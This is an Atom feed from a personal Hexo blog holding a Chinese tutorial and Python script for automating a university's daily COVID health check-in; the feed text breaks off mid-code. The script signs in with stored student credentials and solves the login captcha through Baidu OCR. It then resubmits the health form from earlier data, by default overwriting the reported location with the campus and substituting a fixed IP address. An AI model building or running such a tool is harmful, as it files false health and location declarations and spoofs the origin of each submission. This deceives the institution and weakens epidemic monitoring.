<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>亦往沧劫</title>
  
  <subtitle>&lt;p id=&quot;hitokoto&quot;&gt;Loading...&lt;/p&gt;</subtitle>
  <link href="https://blog.todest.cn/atom.xml" rel="self"/>
  
  <link href="https://blog.todest.cn/"/>
  <updated>2020-12-07T10:29:11.695Z</updated>
  <id>https://blog.todest.cn/</id>
  
  <author>
    <name>亦往沧劫</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>自动健康打卡</title>
    <link href="https://blog.todest.cn/post/934e7461/"/>
    <id>https://blog.todest.cn/post/934e7461/</id>
    <published>2020-12-01T03:56:35.000Z</published>
    <updated>2020-12-07T10:29:11.695Z</updated>
    
    <content type="html"><![CDATA[<p>自动健康打卡(逃</p><p>建议使用Coding定时构建，强烈不推荐使用国外服务器，包括github action。<br><strong>因当天打卡系统异常造成无法打卡时，需等待打卡系统正常后自行打卡或手动触发构建计划。</strong></p><p><strong>本文档以及代码可能会不定时更新，修复和优化，部署成功的能不能在下面留言告诉一下，且留意本文章是否更新，最后更新时间可以看最上方。</strong><br><a id="more"></a></p><h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p>注意将config.ini配置项进行修改，申请AK和SK教程见后文。<br><figure class="highlight ini"><figcaption><span>config.ini</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Basic]</span></span><br><span class="line"><span class="comment">;是否更改健康打卡地址为学校</span></span><br><span class="line"><span class="attr">CHANGE_DATA</span> = <span class="literal">True</span></span><br><span class="line"><span class="comment">;是否修改IP地址</span></span><br><span class="line"><span class="attr">CHANGE_ADDR</span> = <span class="literal">True</span></span><br><span class="line"><span class="comment">;自定义IP地址</span></span><br><span class="line"><span class="attr">IP_ADDR</span> = <span class="number">223.90</span>.<span class="number">40.4</span></span><br><span class="line"></span><br><span class="line"><span class="section">[API]</span></span><br><span class="line"><span class="comment">;百度智能云 文字识别OCR AK</span></span><br><span class="line"><span class="attr">API_KEY</span> = your_api_key</span><br><span class="line"><span class="comment">;百度智能云 文字识别OCR SK</span></span><br><span class="line"><span class="attr">SECRET_KEY</span> = your_secret_key</span><br><span class="line"></span><br><span class="line"><span class="section">[User]</span></span><br><span class="line"><span class="comment">;昵称: [&#x27;账号&#x27;, &#x27;密码&#x27;]</span></span><br><span class="line">sample_user: [&#x27;username&#x27;, &#x27;password&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>添加用户信息，账号密码为<a href="https://uia.hpu.edu.cn">统一认证</a>账号密码。<br>如需多用户，可在<code>[User]</code>下按示例添加新行，注意都为英文符号，昵称随便起，可以为中文。</p><p>上述AK以及SK需前往<a href="https://console.bce.baidu.com/ai/#/ai/ocr/app/list">百度智能云</a>申请文字识别OCR API。<br>点击创建应用，依次填写应用名称，文字识别包名为不需要，应用归属为个人，应用描述后，点击立即创建，返回应用列表，即可得到API Key和Secret Key。</p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>以下是完整代码main.py，无需更改，按之后步骤要求进行上传。</p><figure class="highlight py"><figcaption><span>main.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;自动健康打卡&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> absolute_import</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> retrying <span class="keyword">import</span> retry</span><br><span class="line"></span><br><span class="line"><span class="comment"># 固定链接，不建议修改</span></span><br><span class="line">URL_MAP = &#123;</span><br><span class="line">    <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;https://ehall.hpu.edu.cn/infoplus/form/XSMRJKSB/start&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;START&#x27;</span>: <span class="string">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/start&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ALIVE&#x27;</span>: <span class="string">&#x27;https://ehall.hpu.edu.cn/infoplus/alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CAPTCHA&#x27;</span>: <span class="string">&#x27;https://uia.hpu.edu.cn/sso/apis/v2/open/captcha?date=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;LOGIN&#x27;</span>: <span class="string">&#x27;https://uia.hpu.edu.cn/cas/login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;RENDER&#x27;</span>: <span class="string">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/render&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PROCESS&#x27;</span>: <span class="string">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/instance/[id]/progress&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NEXTSTEP&#x27;</span>: <span class="string">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/listNextStepsUsers&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DOACTION&#x27;</span>: <span class="string">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/doAction&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CHECK&#x27;</span>: <span class="string">&#x27;https://ehall.hpu.edu.cn/taskcenter/api/me/processes/done?limit=1&amp;start=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;API&#x27;</span>: <span class="string">&#x27;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=[ak]&amp;client_secret=[sk]&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URL&#x27;</span>: <span class="string">&#x27;https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求头，可以按需更改</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;Chrome/78.0.3904.108 Safari/537.36 QIHU 360EE&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadConfig</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;读取配置文件类&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, filename</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;配置文件读取初始化&quot;&quot;&quot;</span></span><br><span class="line">        self.config = configparser.ConfigParser()</span><br><span class="line">        self.config[<span class="string">&#x27;Basic&#x27;</span>] = &#123;</span><br><span class="line">            <span class="string">&#x27;CHANGE_DATA&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;CHANGE_ADDR&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;IP_ADDR&#x27;</span>: <span class="string">&#x27;223.90.40.4&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.config.read(filename, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_basic</span>(<span class="params">self, param</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取Basic配置&quot;&quot;&quot;</span></span><br><span class="line">        value = self.config.get(<span class="string">&#x27;Basic&#x27;</span>, param)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_api</span>(<span class="params">self, param</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取API配置&quot;&quot;&quot;</span></span><br><span class="line">        value = self.config.get(<span class="string">&#x27;API&#x27;</span>, param)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_user</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取User配置&quot;&quot;&quot;</span></span><br><span class="line">        value = self.config.items(<span class="string">&#x27;User&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bot</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;自动健康打卡类&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, config_file</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;打卡初始化&quot;&quot;&quot;</span></span><br><span class="line">        logging.basicConfig(level=logging.INFO, format=<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">        self.logger = logging.getLogger(<span class="string">&#x27;AutoReport&#x27;</span>)</span><br><span class="line">        self.logger.info(<span class="string">&#x27;程序启动中...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取配置文件</span></span><br><span class="line">        self.data = ReadConfig(config_file)</span><br><span class="line">        self.chdata = self.data.get_basic(<span class="string">&#x27;CHANGE_DATA&#x27;</span>)</span><br><span class="line">        self.chaddr = self.data.get_basic(<span class="string">&#x27;CHANGE_ADDR&#x27;</span>)</span><br><span class="line">        self.ipaddr = self.data.get_basic(<span class="string">&#x27;IP_ADDR&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.api_key = self.data.get_api(<span class="string">&#x27;API_KEY&#x27;</span>)</span><br><span class="line">        self.secret_key = self.data.get_api(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 登录并打卡</span></span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> self.data.get_user():</span><br><span class="line">            self.sessions = requests.session()</span><br><span class="line">            self.login(user)</span><br><span class="line">            self.post()</span><br><span class="line">            self.sessions.close()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @retry(stop_max_attempt_number=3)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self, user</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;登录&quot;&quot;&quot;</span></span><br><span class="line">        self.logger.info(<span class="string">&#x27;%s开始登录中...&#x27;</span>, user[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 登录页面</span></span><br><span class="line">        req = self.sessions.get(URL_MAP[<span class="string">&#x27;HOST&#x27;</span>], headers=HEADERS)</span><br><span class="line">        req = self.sessions.get(req.url, headers=HEADERS)</span><br><span class="line">        soup = BeautifulSoup(req.content, features=<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">        form = soup.find_all(<span class="string">&#x27;input&#x27;</span>, class_=<span class="string">&#x27;for-form&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证码获取</span></span><br><span class="line">        captcha = URL_MAP[<span class="string">&#x27;CAPTCHA&#x27;</span>] + str(int(round(time.time() * <span class="number">1000</span>)))</span><br><span class="line">        req = self.sessions.get(captcha, headers=HEADERS)</span><br><span class="line">        img = ast.literal_eval(req.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="string">&#x27;img&#x27;</span>]</span><br><span class="line">        self.logger.info(<span class="string">&#x27;验证码获取成功!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证码识别</span></span><br><span class="line">        api = URL_MAP[<span class="string">&#x27;API&#x27;</span>].replace(<span class="string">&#x27;[ak]&#x27;</span>, self.api_key).replace(<span class="string">&#x27;[sk]&#x27;</span>, self.secret_key)</span><br><span class="line">        response = requests.get(api)</span><br><span class="line">        access_token = response.json()[<span class="string">&#x27;access_token&#x27;</span>]</span><br><span class="line">        request_url = URL_MAP[<span class="string">&#x27;REQUEST_URL&#x27;</span>] + <span class="string">&quot;?access_token=&quot;</span> + access_token</span><br><span class="line">        api_headers = &#123;<span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(request_url, data=&#123;<span class="string">&#x27;image&#x27;</span>: img&#125;, headers=api_headers)</span><br><span class="line">        captcha = response.json()[<span class="string">&#x27;words_result&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;words&#x27;</span>]</span><br><span class="line">        captcha = str(captcha.replace(<span class="string">&#x27;=?&#x27;</span>, <span class="string">&#x27;&#x27;</span>)).split(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        captcha = sum(map(int, captcha))</span><br><span class="line">        self.logger.info(<span class="string">&#x27;验证码识别成功!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造表单</span></span><br><span class="line">        token = ast.literal_eval(req.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">        account = ast.literal_eval(user[<span class="number">1</span>])</span><br><span class="line">        formdata = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: account[<span class="number">0</span>],</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: account[<span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;_eventId&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">        &#125;</span><br><span class="line">        formdata.update(&#123;f[<span class="string">&#x27;name&#x27;</span>]: f[<span class="string">&#x27;value&#x27;</span>] <span class="keyword">for</span> f <span class="keyword">in</span> form&#125;)</span><br><span class="line">        formdata.update(&#123;<span class="string">&#x27;captcha&#x27;</span>: captcha&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 登录</span></span><br><span class="line">        req = self.sessions.post(URL_MAP[<span class="string">&#x27;LOGIN&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class="line">        soup = BeautifulSoup(req.content, features=<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        errormes = soup.find(<span class="string">&#x27;span&#x27;</span>, id=<span class="string">&#x27;errormes&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> errormes:</span><br><span class="line">            self.logger.error(errormes[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">            <span class="keyword">raise</span> Exception(errormes[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检测登录状态</span></span><br><span class="line">        url = self.sessions.get(URL_MAP[<span class="string">&#x27;HOST&#x27;</span>], headers=HEADERS).url</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url == URL_MAP[<span class="string">&#x27;HOST&#x27;</span>]:</span><br><span class="line">            self.logger.error(<span class="string">&#x27;登录失败, 未知错误!&#x27;</span>)</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;登录失败, 未知错误!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.logger.info(<span class="string">&#x27;使用账号密码登录成功!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @retry(stop_max_attempt_number=3)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;打卡&quot;&quot;&quot;</span></span><br><span class="line">        self.logger.info(<span class="string">&#x27;打卡进行中...&#x27;</span>)</span><br><span class="line">        req = self.sessions.get(URL_MAP[<span class="string">&#x27;HOST&#x27;</span>], headers=HEADERS)</span><br><span class="line">        soup = BeautifulSoup(req.content, features=<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造表单</span></span><br><span class="line">        csrf = soup.find(<span class="string">&#x27;meta&#x27;</span>, itemscope=<span class="string">&#x27;csrfToken&#x27;</span>)[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        formdata = &#123;</span><br><span class="line">            <span class="string">&#x27;idc&#x27;</span>: <span class="string">&#x27;XSMRJKSB&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;release&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class="line">            <span class="string">&#x27;formData&#x27;</span>: <span class="string">&#x27;&#123;&quot;_VAR_URL&quot;:&quot;https://ehall.hpu.edu.cn/infoplus/form/XSMRJKSB/start&quot;,&quot;_VAR_URL_Attr&quot;:&quot;&#123;&#125;&quot;&#125;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        req = self.sessions.post(URL_MAP[<span class="string">&#x27;START&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class="line">        url = req.json()[<span class="string">&#x27;entities&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造表单</span></span><br><span class="line">        stepid = int(re.findall(<span class="string">r&#x27;\d+&#x27;</span>, url)[<span class="number">0</span>])</span><br><span class="line">        self.logger.info(<span class="string">&#x27;开始流程%s中...&#x27;</span>, stepid)</span><br><span class="line">        formdata = &#123;</span><br><span class="line">            <span class="string">&#x27;stepId&#x27;</span>: stepid,</span><br><span class="line">            <span class="string">&#x27;instanceId&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;admin&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;rand&#x27;</span>: random.random() * <span class="number">999</span>,</span><br><span class="line">            <span class="string">&#x27;width&#x27;</span>: <span class="string">&#x27;1747&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;lang&#x27;</span>: <span class="string">&#x27;zh&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;csrfToken&#x27;</span>: csrf</span><br><span class="line">        &#125;</span><br><span class="line">        HEADERS.update(&#123;<span class="string">&#x27;Referer&#x27;</span>: url&#125;)</span><br><span class="line">        req = self.sessions.post(URL_MAP[<span class="string">&#x27;RENDER&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class="line">        self.logger.info(<span class="string">&#x27;已加载审批表!&#x27;</span>)</span><br><span class="line">        form = req.json()[<span class="string">&#x27;entities&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造表单</span></span><br><span class="line">        instanceid = form[<span class="string">&#x27;step&#x27;</span>][<span class="string">&#x27;instanceId&#x27;</span>]</span><br><span class="line">        formdata = &#123;</span><br><span class="line">            <span class="string">&#x27;stepId&#x27;</span>: stepid,</span><br><span class="line">            <span class="string">&#x27;includingTop&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class="line">            <span class="string">&#x27;lang&#x27;</span>: <span class="string">&#x27;zh&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        req = self.sessions.post(URL_MAP[<span class="string">&#x27;PROCESS&#x27;</span>].replace(<span class="string">&#x27;[id]&#x27;</span>, instanceid), headers=HEADERS, data=formdata)</span><br><span class="line">        self.logger.info(<span class="string">&#x27;审批表处理中...&#x27;</span>)</span><br><span class="line">        timestamp = req.json()[<span class="string">&#x27;entities&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;remarks&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;assignTime&#x27;</span>]</span><br><span class="line">        boundfields = <span class="string">&#x27;,&#x27;</span>.join(list(form[<span class="string">&#x27;data&#x27;</span>].keys()))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造表单</span></span><br><span class="line">        postdata = form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> self.chdata:</span><br><span class="line">            fixdata = &#123;</span><br><span class="line">                <span class="string">&#x27;fieldTXcs&#x27;</span>: <span class="string">&#x27;410800&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;fieldTXcs_Name&#x27;</span>: <span class="string">&#x27;焦作市&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;fieldTXdq&#x27;</span>: <span class="string">&#x27;410811&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;fieldTXdq_Name&#x27;</span>: <span class="string">&#x27;山阳区&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;fieldTXjtwz&#x27;</span>: <span class="string">&#x27;河南理工大学&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            postdata.update(fixdata)</span><br><span class="line">        <span class="keyword">if</span> self.chaddr:</span><br><span class="line">            postdata.update(&#123;<span class="string">&#x27;_VAR_ADDR&#x27;</span>: self.ipaddr&#125;)</span><br><span class="line">        formdata = &#123;</span><br><span class="line">            <span class="string">&#x27;stepId&#x27;</span>: stepid,</span><br><span class="line">            <span class="string">&#x27;actionId&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;formData&#x27;</span>: str(postdata),</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>: timestamp,</span><br><span class="line">            <span class="string">&#x27;rand&#x27;</span>: random.random() * <span class="number">999</span>,</span><br><span class="line">            <span class="string">&#x27;boundFields&#x27;</span>: boundfields,</span><br><span class="line">            <span class="string">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class="line">            <span class="string">&#x27;lang&#x27;</span>: <span class="string">&#x27;zh&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        req = self.sessions.post(URL_MAP[<span class="string">&#x27;NEXTSTEP&#x27;</span>], headers=HEADERS, data=formdata)</span><br><span class="line">        <span class="keyword">if</span> req.json()[<span class="string">&#x27;ecode&#x27;</span>] == <span class="string">&#x27;SUCCEED&#x27;</span>:</span><br><span class="line">            self.logger.info(<span class="string">&#x27;健康打卡准备阶段, 成功!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;健康打卡准备阶段, 失败!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造表单</span></span><br><span class="line">        formdata = &#123;</span><br><span class="line">            <span class="string">&#x27;actionId&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;formData&#x27;</span>: str(form[<span class="string">&#x27;data&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;remark&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;rand&#x27;</span>: random.random() * <span class="number">999</span>,</span><br><span class="line">            <span class="string">&#x27;nextUsers&#x27;</span>: <span class="string">&#x27;&#123;&#125;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;stepId&#x27;</span>: stepid,</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>: timestamp,</span><br><span class="line">            <span class="string">&#x27;boundFields&#x27;</span>: boundfields,</span><br><span class="line">            <span class="string">&#x27;csrfToken&#x27;</span>: csrf,</span><br><span class="line">       